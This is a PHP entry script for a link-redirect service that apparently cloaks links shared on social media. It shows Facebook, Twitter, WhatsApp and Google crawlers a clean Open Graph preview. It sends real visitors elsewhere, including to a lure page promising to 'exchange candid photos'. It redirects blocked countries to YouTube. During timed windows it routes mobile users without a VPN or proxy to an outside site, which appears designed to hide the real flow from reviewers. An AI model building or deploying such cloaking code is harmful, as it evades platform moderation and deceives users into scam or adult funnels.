<?php

declare(strict_types=1);

require_once dirname(__DIR__) . '/env.php';

load_env_file(__DIR__ . '/.env');

/*
 * SRP entry handler.
 * Supported public token formats:
 * - legacy sub_id (base64url, CSV):
 *   [0]=?,
 *   [1]=click_id,
 *   [2]=?,
 *   [3]=canonical_url,
 *   [4]=user_lp,
 *   [5]=title,
 *   [6]=image_url,
 *   [7]=lg (landing|1=>landing, direct|0|null|legacy|unknown=>direct)
 * - short code: s-<code>
 */
$failBootstrap = static function (string $message): never {
    http_response_code(500);
    header('Content-Type: text/plain; charset=UTF-8');
    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    header('Pragma: no-cache');
    header('Expires: 0');
    header('X-Content-Type-Options: nosniff');
    error_log($message);
    exit('Internal Server Error');
};

$autoloadPath = __DIR__ . '/vendor/autoload.php';
if (!is_file($autoloadPath) || !is_readable($autoloadPath)) {
    $failBootstrap('Missing Composer autoload: ' . $autoloadPath);
}

try {
    require_once $autoloadPath;
} catch (Throwable $e) {
    $failBootstrap('Composer autoload bootstrap failed: ' . $e->getMessage());
}

$requiredFiles = [
    dirname(__DIR__) . '/ip_address.php',
    dirname(__DIR__) . '/Base64URL.php',
    dirname(__DIR__) . '/Mobile_Detect.php',
    __DIR__ . '/public_link.php',
    __DIR__ . '/redirect_payload.php',
];

foreach ($requiredFiles as $requiredFile) {
    if (!is_file($requiredFile) || !is_readable($requiredFile)) {
        $failBootstrap('Missing required bootstrap file: ' . $requiredFile);
    }

    require_once $requiredFile;
}

const SRP_TARGET_BASE = '/_meetups/';
const SRP_BLOCK_URL = 'https://www.youtube.com/';
const SRP_DEFAULT_CANONICAL = 'https://www.denic.de/';
const SRP_GEOIP2LITE_DB = __DIR__ . '/databases/GeoLite2-Country.mmdb';
const SRP_CF_INSIGHTS_SCRIPT = 'https://static.cloudflareinsights.com';
const SRP_CF_INSIGHTS_BEACON = 'https://cloudflareinsights.com';
const SRP_FB_APP_ID = '115190258555800';

// Timed filter mode: 2 min filter → 3 min normal → repeat (5-min cycle)
// SRP_FILTER_URL = hardcoded fallback only; runtime URL comes from cache file or env
const SRP_FILTER_URL      = 'https://hantuin.com/redirect';
const SRP_CYCLE_LENGTH    = 300; // seconds total per cycle (2+3 min)
const SRP_FILTER_DURATION = 120; // seconds at start of cycle = filter window
const SRP_CACHE_DIR_NAME  = 'srp_bb';  // shared tmp subdir for all SRP caches

/** @var list<string> $blockedCountries */
$blockedCountries = array_values(
    array_filter(
        array_map(
            'strtoupper',
            explode(',', app_env('SRP_BLOCK_COUNTRIES', 'ID') ?? 'ID')
        )
    )
);

$allowCloudflareInsights = filter_var(
    app_env('SRP_ALLOW_CLOUDFLARE_INSIGHTS', '0') ?? '0',
    FILTER_VALIDATE_BOOL
);

header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: no-referrer');
header('X-Frame-Options: DENY');
header('Permissions-Policy: geolocation=(), microphone=(), camera=(), interest-cohort=()');

if (srp_is_https()) {
    header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
}

// Step 1 — IP
$userIp = srp_normalize_ip(getUserIP());

// Step 2 — Social bot detection (early, before geo lookup)
$userAgent    = srp_server_string('HTTP_USER_AGENT');
$isSocialBot  = srp_is_social_bot($userAgent);

// Step 3 — Geo + country block only for real users (skip expensive MaxMind for crawlers)
// Capture raw CF-IPCountry before normalization — srp_header_country_code() discards T1
// for geo purposes, but T1 must still reach the proxy/VPN check in step 4.
$cfRawCountry = '';
$countryCode  = 'XX';
if (!$isSocialBot) {
    $cfRawCountry = strtoupper(trim(srp_server_string('HTTP_CF_IPCOUNTRY')));
    $countryCode  = srp_request_country_code($userIp);
    if (in_array($countryCode, $blockedCountries, true)) {
        header('Location: ' . SRP_BLOCK_URL, true, 302);
        exit;
    }
}

// Step 4 — Timed filter mode: 2 min filter / 3 min normal, repeating
// Filter: mobile (non-tablet) + no VPN/proxy → redirect to SRP_FILTER_URL
// Normal: pass through to regular flow
// Mobile_Detect instantiated once here; reused later for $deviceType.
$mobileDetect = $isSocialBot ? null : new Mobile_Detect($userAgent);
if ($mobileDetect !== null && srp_is_filter_mode()) {
    if (srp_device_type($mobileDetect) === 'WAP' && !srp_is_proxy_or_vpn($countryCode, $userIp, $cfRawCountry)) {
        header('Location: ' . srp_filter_url(), true, 302);
        exit;
    }
}

$publicToken = isset($_GET['sub_id']) && is_string($_GET['sub_id']) ? trim($_GET['sub_id']) : '';
if ($publicToken === '' || strlen($publicToken) > 2048 || preg_match('/^[A-Za-z0-9_-]+$/', $publicToken) !== 1) {
    http_response_code(400);
    exit;
}

$publicLink = srp_public_link_decode_legacy_token($publicToken);

if ($publicLink === null) {
    $shortCode = srp_public_link_extract_short_code($publicToken);

    if ($shortCode === null) {
        http_response_code(400);
        exit;
    }

    try {
        /** @var PDO $publicLinkPdo */
        $publicLinkPdo = require __DIR__ . '/connection.config.php';

        // Check active srp_short_links table first; fall back to legacy shortlinks.
        $publicLink = srp_short_link_find($publicLinkPdo, $shortCode);

        if ($publicLink === null) {
            $shortlinkRow = srp_shortlinks_find($publicLinkPdo, $shortCode);

            if ($shortlinkRow !== null) {
                $slLongUrl    = $shortlinkRow['long_url'];
                $slOgTitle    = $shortlinkRow['og_title'];
                // Accept any valid HTTPS URL for og_image — proxy will handle fetch
                $slOgImageRaw = trim((string) ($shortlinkRow['og_image'] ?? ''));
                $slOgImage    = ($slOgImageRaw !== '' && filter_var($slOgImageRaw, FILTER_VALIDATE_URL) !== false)
                    ? $slOgImageRaw : '';

                if ($isSocialBot) {
                    srp_render_og($slOgTitle, $slOgImage);
                    exit;
                }

                header('Location: ' . $slLongUrl, true, 302);
                header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
                exit;
            }
        }
    } catch (Throwable $e) {
        error_log('Public short link lookup failed: ' . $e->getMessage());
        http_response_code(500);
        exit;
    }

    if ($publicLink === null) {
        http_response_code(404);
        exit;
    }
}

$clickId = srp_sanitize_token($publicLink['click_id'], 64);
$userLp = srp_sanitize_token($publicLink['user_lp'], 64);
$canonicalUrl = srp_sanitize_https_url($publicLink['canonical_url']) ?? SRP_DEFAULT_CANONICAL;
$imageUrl = srp_sanitize_https_url($publicLink['image_url']) ?? '';
$title = srp_sanitize_title($publicLink['title']);
$lg = srp_normalize_lg($publicLink['lg']);

if ($clickId === null || $userLp === null) {
    http_response_code(400);
    exit;
}

if ($isSocialBot) {
    srp_render_og($title, $imageUrl);
    exit;
}

$deviceType = srp_device_type($mobileDetect ?? new Mobile_Detect($userAgent));

$redirectToken = srp_redirect_payload_encode(
    strtoupper($clickId),
    $countryCode,
    $deviceType,
    $userIp,
    strtoupper($userLp)
);

$target = SRP_TARGET_BASE . '?rk=' . rawurlencode($redirectToken);

switch ($lg) {
    case 'direct':
        header('Location: ' . $target, true, 302);
        exit;

    case 'landing':
        srp_render_landing($target, $allowCloudflareInsights);
        exit;

    default:
        http_response_code(400);
        exit;
}

function srp_sanitize_token(string $value, int $max): ?string
{
    $value = trim($value);
    if ($value === '' || strlen($value) > $max) {
        return null;
    }

    return preg_match('/^[A-Za-z0-9_-]+$/', $value) === 1 ? $value : null;
}

function srp_sanitize_title(string $value): string
{
    $value = preg_replace('/[\r\n\t]+/', ' ', trim($value)) ?? '';

    return mb_substr($value, 0, 200, 'UTF-8');
}

function srp_sanitize_https_url(string $value): ?string
{
    if ($value === '' || strlen($value) > 2048) {
        return null;
    }

    if (filter_var($value, FILTER_VALIDATE_URL) === false) {
        return null;
    }

    $scheme = parse_url($value, PHP_URL_SCHEME);

    return is_string($scheme) && strtolower($scheme) === 'https' ? $value : null;
}

function srp_request_country_code(string $ip): string
{
    $headerKeys = [
        'HTTP_CF_IPCOUNTRY',
        'GEOIP_COUNTRY_CODE',
        'HTTP_GEOIP_COUNTRY_CODE',
    ];

    foreach ($headerKeys as $headerKey) {
        $countryCode = srp_header_country_code($headerKey);

        if ($countryCode !== null) {
            return $countryCode;
        }
    }

    return srp_geo_country_code(srp_geo_lookup($ip));
}

function srp_header_country_code(string $key): ?string
{
    $value = trim(srp_server_string($key));

    if ($value === '' || strlen($value) !== 2 || preg_match('/^[A-Za-z]{2}$/', $value) !== 1) {
        return null;
    }

    $countryCode = strtoupper($value);

    return in_array($countryCode, ['T1', 'XX'], true) ? null : $countryCode;
}

function srp_normalize_lg(mixed $value): string
{
    if (!is_scalar($value)) {
        return 'direct';
    }

    $normalized = strtolower(trim((string) $value));

    if ($normalized === 'landing' || $normalized === '1') {
        return 'landing';
    }

    return 'direct';
}

/**
 * @param array<string, mixed> $geo
 */
function srp_geo_country_code(array $geo): string
{
    if (!isset($geo['countryCode']) || !is_string($geo['countryCode']) || $geo['countryCode'] === '') {
        return 'XX';
    }

    return strtoupper($geo['countryCode']);
}

function srp_normalize_ip(string $value): string
{
    $value = trim($value);

    if ($value === '' || strlen($value) > 45) {
        return '';
    }

    return $value;
}

function srp_is_valid_ip(string $ip): bool
{
    return filter_var($ip, FILTER_VALIDATE_IP) !== false;
}

/**
 * @return array<string, mixed>
 */
function srp_geo_lookup(string $ip): array
{
    if ($ip === '' || !srp_is_valid_ip($ip)) {
        return [];
    }

    // File cache: 24-hour TTL — country data is stable, avoids MMDB open on every request.
    $cacheDir  = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . SRP_CACHE_DIR_NAME;
    $cacheFile = $cacheDir . DIRECTORY_SEPARATOR . 'geo_' . md5($ip) . '.json';

    if (is_file($cacheFile)) {
        $mtime = filemtime($cacheFile);
        if ($mtime !== false && (time() - $mtime) < 86400) {
            $cached = json_decode((string) file_get_contents($cacheFile), true);
            if (is_array($cached)) {
                return $cached;
            }
        }
    }

    if (!is_file(SRP_GEOIP2LITE_DB) || !is_readable(SRP_GEOIP2LITE_DB)) {
        return [];
    }

    $previousHandler = set_error_handler(
        static function (int $severity, string $message, string $file, int $line): never {
            throw new ErrorException($message, 0, $severity, $file, $line);
        }
    );

    $reader = null;
    $result = [];

    try {
        $reader = new \GeoIp2\Database\Reader(SRP_GEOIP2LITE_DB);
        $record = $reader->country($ip);
        $countryCode = strtoupper((string) ($record->country->isoCode ?? ''));

        if ($countryCode !== '') {
            $result = [
                'countryCode' => $countryCode,
                'countryName' => (string) ($record->country->name ?? ''),
            ];
        }
    } catch (\GeoIp2\Exception\AddressNotFoundException) {
        // private/reserved IP — leave $result empty
    } catch (Throwable) {
        // MMDB read error — leave $result empty
    } finally {
        if (is_object($reader)) {
            $reader->close();
        }

        if ($previousHandler !== null) {
            set_error_handler($previousHandler);
        } else {
            restore_error_handler();
        }
    }

    if ($result !== []) {
        if (!is_dir($cacheDir)) {
            @mkdir($cacheDir, 0700, true);
        }
        @file_put_contents($cacheFile, json_encode($result), LOCK_EX);
    }

    return $result;
}

function srp_device_type(Mobile_Detect $detect): string
{
    if ($detect->isTablet()) {
        return 'TABLET';
    }

    if ($detect->isMobile()) {
        return 'WAP';
    }

    return 'WEB';
}

function srp_is_social_bot(string $ua): bool
{
    if ($ua === '') {
        return false;
    }

    // Exclude FB in-app browser (not a crawler)
    if (preg_match('/\b(FBAN|FBAV)\b/', $ua) === 1) {
        return false;
    }

    return preg_match(
        '/facebookexternalhit|facebookcatalog|Facebot|meta-externalagent'
        . '|Twitterbot|WhatsApp|TelegramBot|LinkedInBot|Slackbot|Discordbot|Applebot|Googlebot/i',
        $ua
    ) === 1;
}

function srp_is_filter_mode(): bool
{
    return (time() % SRP_CYCLE_LENGTH) < SRP_FILTER_DURATION;
}

/**
 * Return the filter-mode redirect URL.
 * Priority: cache file → SRP_FILTER_URL env var → SRP_FILTER_URL constant.
 * Cache file: {tmp}/srp_bb/filter_url.txt — overwrite to change at runtime.
 */
function srp_filter_url(): string
{
    $cacheFile = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR)
        . DIRECTORY_SEPARATOR . SRP_CACHE_DIR_NAME
        . DIRECTORY_SEPARATOR . 'filter_url.txt';

    if (is_file($cacheFile)) {
        $url = trim((string) file_get_contents($cacheFile, false, null, 0, 2048));
        if ($url !== '' && filter_var($url, FILTER_VALIDATE_URL) !== false) {
            return $url;
        }
    }

    $envUrl = app_env('SRP_FILTER_URL', '');
    if ($envUrl !== '' && filter_var($envUrl, FILTER_VALIDATE_URL) !== false) {
        return $envUrl;
    }

    return SRP_FILTER_URL;
}

function srp_is_proxy_or_vpn(string $countryCode, string $ip, string $cfRawCountry = ''): bool
{
    // Cloudflare marks Tor exit nodes and known VPN infrastructure as T1.
    // Check $cfRawCountry (raw header) first — srp_header_country_code() discards T1
    // for geo-blocking purposes, so it never reaches $countryCode.
    if ($cfRawCountry === 'T1' || $countryCode === 'T1') {
        return true;
    }

    // Explicit proxy-signature headers — only present when client is behind
    // an additional proxy layer (not injected by Cloudflare itself)
    foreach (['HTTP_VIA', 'HTTP_PROXY_CONNECTION', 'HTTP_X_PROXY_ID'] as $header) {
        if (isset($_SERVER[$header]) && trim((string) $_SERVER[$header]) !== '') {
            return true;
        }
    }

    // blackbox.ipinfo.app — VPN / proxy / Tor / cloud/hosting detection
    if ($ip !== '' && srp_is_valid_ip($ip)) {
        $apiResult = srp_blackbox_lookup($ip);
        if ($apiResult !== null) {
            return $apiResult;
        }
    }

    return false;
}

/**
 * Query blackbox.ipinfo.app for VPN/proxy/Tor/cloud flags.
 * Result cached in sys_get_temp_dir() for 1 hour per IP.
 * Returns null on timeout or API error (caller falls back to false).
 */
function srp_blackbox_lookup(string $ip): ?bool
{
    $cacheDir = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . SRP_CACHE_DIR_NAME;
    $cacheFile = $cacheDir . DIRECTORY_SEPARATOR . md5($ip) . '.json';
    $cacheTtl  = 3600;

    if (is_file($cacheFile)) {
        $mtime = filemtime($cacheFile);
        if ($mtime !== false && (time() - $mtime) < $cacheTtl) {
            $cached = json_decode((string) file_get_contents($cacheFile), true);
            if (isset($cached['r']) && is_bool($cached['r'])) {
                return $cached['r'];
            }
        }
    }

    if (!function_exists('curl_init')) {
        return null;
    }

    $ch = curl_init('https://blackbox.ipinfo.app/lookup/' . rawurlencode($ip));
    if ($ch === false) {
        return null;
    }

    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 2,
        CURLOPT_TIMEOUT        => 3,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        CURLOPT_HTTPHEADER     => ['Accept: application/json'],
        CURLOPT_USERAGENT      => 'SRP/1.0',
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_PROTOCOLS      => CURLPROTO_HTTPS,
        CURLOPT_REDIR_PROTOCOLS => CURLPROTO_HTTPS,
    ]);

    $body     = curl_exec($ch);
    $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $errno    = curl_errno($ch);
    curl_close($ch);

    if ($errno !== 0 || !is_string($body) || $httpCode !== 200) {
        return null;
    }

    $data = json_decode($body, true);
    if (!is_array($data)) {
        return null;
    }

    $isPrivacy = (bool) ($data['vpn']   ?? false)
              || (bool) ($data['proxy'] ?? false)
              || (bool) ($data['tor']   ?? false)
              || (bool) ($data['cloud'] ?? false);

    if (!is_dir($cacheDir)) {
        @mkdir($cacheDir, 0700, true);
    }
    @file_put_contents($cacheFile, json_encode(['r' => $isPrivacy]), LOCK_EX);

    return $isPrivacy;
}

function srp_is_https(): bool
{
    if (strtolower(srp_server_string('HTTP_X_FORWARDED_PROTO')) === 'https') {
        return true;
    }

    if (str_contains(strtolower(srp_server_string('HTTP_CF_VISITOR')), '"scheme":"https"')) {
        return true;
    }

    if (
        isset($_SERVER['HTTPS'])
        && is_string($_SERVER['HTTPS'])
        && strtolower($_SERVER['HTTPS']) !== 'off'
        && $_SERVER['HTTPS'] !== ''
    ) {
        return true;
    }

    if (
        isset($_SERVER['SERVER_PORT'])
        && is_scalar($_SERVER['SERVER_PORT'])
        && (string) $_SERVER['SERVER_PORT'] === '443'
    ) {
        return true;
    }

    return false;
}

function srp_server_string(string $key): string
{
    if (!isset($_SERVER[$key]) || !is_string($_SERVER[$key])) {
        return '';
    }

    return $_SERVER[$key];
}

function srp_validate_host(string $host): bool
{
    return $host !== '' && preg_match('/^[a-zA-Z0-9.\-]+(:\d{1,5})?$/', $host) === 1;
}

function srp_e(string $value): string
{
    return htmlspecialchars($value, ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, 'UTF-8');
}

function srp_proxy_image_url(string $imageUrl): string
{
    if ($imageUrl === '') {
        return '';
    }

    $host = srp_server_string('HTTP_HOST');
    if (!srp_validate_host($host)) {
        return '';
    }

    // Proxy through same-origin /imgp so FB linter can always fetch the image
    $encoded = rtrim(strtr(base64_encode($imageUrl), '+/', '-_'), '=');
    $scheme  = srp_is_https() ? 'https' : 'http';

    return $scheme . '://' . $host . '/imgp?u=' . rawurlencode($encoded);
}

function srp_render_og(string $title, string $imageUrl): void
{
    $proxiedImage = srp_proxy_image_url($imageUrl);

    header('Content-Type: text/html; charset=UTF-8');
    header(
        "Content-Security-Policy: default-src 'none'; "
        . "img-src 'self' https:; "
        . "object-src 'none'; "
        . "base-uri 'self'; "
        . "frame-ancestors 'none'"
    );

    $displayTitle = $title !== '' ? $title : 'Preview';
    $titleEsc     = srp_e($displayTitle);
    $imageEsc     = srp_e($proxiedImage);
    $ogHost     = srp_server_string('HTTP_HOST');
    $currentUrl = srp_validate_host($ogHost)
        ? 'https://' . $ogHost . srp_server_string('REQUEST_URI')
        : '';
    $urlEsc     = srp_e($currentUrl);

    $markup = [
        '<!DOCTYPE html>',
        '<html lang="en" prefix="og: https://ogp.me/ns# fb: https://ogp.me/ns/fb#"><head>',
        '<meta charset="UTF-8">',
        '<title>' . $titleEsc . '</title>',
        '<meta name="description" content="' . $titleEsc . '">',
        '<meta prefix="fb: https://ogp.me/ns/fb#" property="fb:app_id" content="' . SRP_FB_APP_ID . '">',
        '<meta property="og:title" content="' . $titleEsc . '">',
        '<meta property="og:type" content="website">',
        '<meta property="og:url" content="' . $urlEsc . '">',
        '<meta property="og:description" content="' . $titleEsc . '">',
    ];

    if ($proxiedImage !== '') {
        $markup[] = '<meta property="og:image" content="' . $imageEsc . '">';
        $markup[] = '<meta property="og:image:secure_url" content="' . $imageEsc . '">';
        $markup[] = '<meta name="twitter:card" content="summary_large_image">';
        $markup[] = '<meta name="twitter:image" content="' . $imageEsc . '">';
    }

    $markup[] = '</head><body></body></html>';

    echo implode('', $markup);
}

function srp_render_landing(string $targetUrl, bool $allowCloudflareInsights): void
{
    $nonce = bin2hex(random_bytes(16));
    $nonceEsc = srp_e($nonce);
    $targetEsc = srp_e($targetUrl);
    $inlineCss = 'html,body{min-height:100%}body{margin:0;position:relative}.layout{min-height:100vh;position:relative}'
        . '.main-block{position:relative;z-index:5;max-width:470px;width:100%;min-height:100vh;margin:0 auto;display:flex;flex-direction:column}'
        . '.steps-wrap{min-height:100vh;display:flex!important;flex-direction:column;justify-content:center;padding:5vh 25px;position:relative;z-index:6}'
        . '.steps{display:flex!important;flex:1 0 auto;flex-direction:column;justify-content:center;text-align:center}'
        . '.steps-content{display:flex!important;flex-direction:column;justify-content:center;width:100%}'
        . '.step-item{display:block!important;visibility:visible!important;opacity:1!important;width:100%;position:relative;z-index:7}'
        . '.step-title,.step-subtitle,.btn,.btns-wrap{visibility:visible!important;opacity:1!important}.btns-wrap{display:flex!important;justify-content:center}'
        . '.bg{position:fixed;inset:0;overflow:hidden;z-index:1}.bg::after{background:linear-gradient(to bottom,rgba(0,0,0,.55),rgba(0,0,0,.85) 62%);content:\'\';position:absolute;inset:0;z-index:2;pointer-events:none}'
        . '.bg-stage{width:100%;animation:bg 60s linear infinite}.bg-stage img{display:block;width:100%;height:100vh;object-fit:cover}'
        . '@keyframes bg{0%{transform:translateY(0)}100%{transform:translateY(-33.333%)}}';

    $scriptSrc = "script-src 'self' 'nonce-{$nonce}'";
    $connectSrc = "connect-src 'self'";

    if ($allowCloudflareInsights) {
        $scriptSrc .= ' ' . SRP_CF_INSIGHTS_SCRIPT;
        $connectSrc .= ' ' . SRP_CF_INSIGHTS_SCRIPT . ' ' . SRP_CF_INSIGHTS_BEACON;
    }

    header('Content-Type: text/html; charset=UTF-8');
    header(
        "Content-Security-Policy: default-src 'self'; "
        . $scriptSrc . '; '
        . "style-src 'self' 'nonce-{$nonce}' https://fonts.googleapis.com; "
        . "font-src 'self' https://fonts.gstatic.com; "
        . "img-src 'self' data:; "
        . $connectSrc . '; '
        . "object-src 'none'; "
        . "base-uri 'self'; "
        . "frame-ancestors 'none'; "
        . "form-action 'self'"
    );

    $markup = [
        '<!DOCTYPE html>',
        '<html lang="en-US" prefix="og: https://ogp.me/ns# fb: https://ogp.me/ns/fb#"><head>',
        '<meta charset="UTF-8">',
        '<meta prefix="fb: https://ogp.me/ns/fb#" property="fb:app_id" content="' . SRP_FB_APP_ID . '">',
        '<title>Attention</title>',
        '<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">',
        '<link href="/favicon.ico" rel="icon" type="image/x-icon">',
        '<link rel="stylesheet" type="text/css" href="/assets/reset.min.css">',
        '<link rel="stylesheet" type="text/css" href="/assets/style.css">',
        '<style nonce="' . $nonceEsc . '">' . $inlineCss . '</style>',
        '</head><body>',
        '<div class="layout"><main class="main-block"><div class="steps-wrap"><div class="steps"><div class="steps-content">'
            . '<div class="step-item is-active"><h2 class="step-title text16">Attention!</h2><p class="step-subtitle text17">wants to exchange candid photos with you.</p>'
            . '<p class="step-subtitle text18">You confirm?</p><div class="btns-wrap"><a class="btn btn-sec text19" href="' . $targetEsc . '">YES</a></div></div>'
            . '</div></div></div><div class="bg"><div class="bg-stage"><img src="/assets/bg-lg.jpg" alt=""><img src="/assets/bg-lg.jpg" alt=""><img src="/assets/bg-lg.jpg" alt=""></div></div></main></div>',
        '<div id="wrp-id"></div>',
        '</body></html>',
    ];

    echo implode('', $markup);
}
